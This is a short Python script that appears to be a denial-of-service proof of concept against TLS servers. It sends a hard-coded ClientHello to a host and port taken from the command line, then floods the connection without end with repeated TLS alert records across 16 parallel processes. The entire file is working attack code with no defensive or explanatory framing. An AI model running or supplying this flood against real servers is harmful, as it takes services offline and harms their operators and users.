#! /usr/bin/python

import socket
from multiprocessing import Pool
import binascii
import sys
import time


def send_alert(hostname, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((hostname, port))
    # Client Hello
    clienthello = binascii.unhexlify("1603010049010000450301303132333435363738393031323334353637383930313233343536373839303100000e00040005000a002f0035003c003d0100000e000f000101000500050100000000")
    alert_message = "\x15\x03\x01\x00\x02\x01\x2a"*2000
    sock.send(clienthello)
    while True:
        sock.sendall(alert_message)



def main():
    num = 16
    pool = Pool(num)
    for i in range(num):
        pool.apply_async(send_alert, args = (sys.argv[1], int(sys.argv[2])))
    while True:
        time.sleep(10)


if __name__ == "__main__":
    main()

